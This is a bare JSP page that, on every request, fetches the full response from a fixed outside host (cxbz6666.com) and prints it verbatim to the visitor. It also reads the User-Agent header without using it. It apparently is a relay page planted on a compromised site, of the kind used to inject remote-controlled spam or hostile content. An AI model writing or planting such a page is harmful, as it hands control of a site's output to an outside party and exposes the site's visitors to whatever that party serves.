<%@ page contentType="text/html;charset=gb2312"%>
<%@ page import="java.io.*,java.net.URL,java.util.*"%>
<%  
String sCurrentLine;  
String sTotalString;  
String ref = "";
ref = request.getHeader("user-agent");
sCurrentLine=""; 
sTotalString="";
String pathurl="";
java.io.InputStream l_urlStream;
pathurl = "http://www.cxbz6666.com/"; 
java.net.URL l_url = new java.net.URL(pathurl);  
java.net.HttpURLConnection l_connection = (java.net.HttpURLConnection) l_url.openConnection();  
l_connection.connect();  
l_urlStream = l_connection.getInputStream();  
java.io.BufferedReader l_reader = new java.io.BufferedReader(new java.io.InputStreamReader(l_urlStream,"gb2312"));  
while ((sCurrentLine = l_reader.readLine()) != null)  
{  
sTotalString+=sCurrentLine+"\r\n";
}  
out.println(sTotalString);  

%> 